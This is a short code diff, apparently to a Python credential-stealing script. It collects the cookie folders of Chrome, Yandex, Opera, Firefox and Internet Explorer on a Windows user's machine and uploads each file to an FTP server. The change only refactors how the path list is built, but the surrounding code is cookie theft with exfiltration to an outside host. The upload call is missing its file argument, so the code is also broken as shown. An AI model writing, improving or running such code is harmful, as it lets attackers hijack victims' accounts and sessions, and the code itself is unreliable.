@@ -14,16 +14,10 @@ opera_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Opera Softwa
 mozilla_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qx1fqa6b.Default User\\'
 internet_explorer_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\'
 
-paths.append(chrome_cookie_path)
-paths.append(yandex_cookie_path)
-paths.append(opera_cookie_path)
-paths.append(mozilla_cookie_path)
-paths.append(internet_explorer_cookie_path)
+paths = [chrome_cookie_path, yandex_cookie_path, opera_cookie_path, mozilla_cookie_path, internet_explorer_cookie_path]
 
 for path in paths:
     if os.path.exists(path):
         for file in os.listdir(path):
             ftp_server.storbinary('STOR ' + file)
-        
-
-
+       
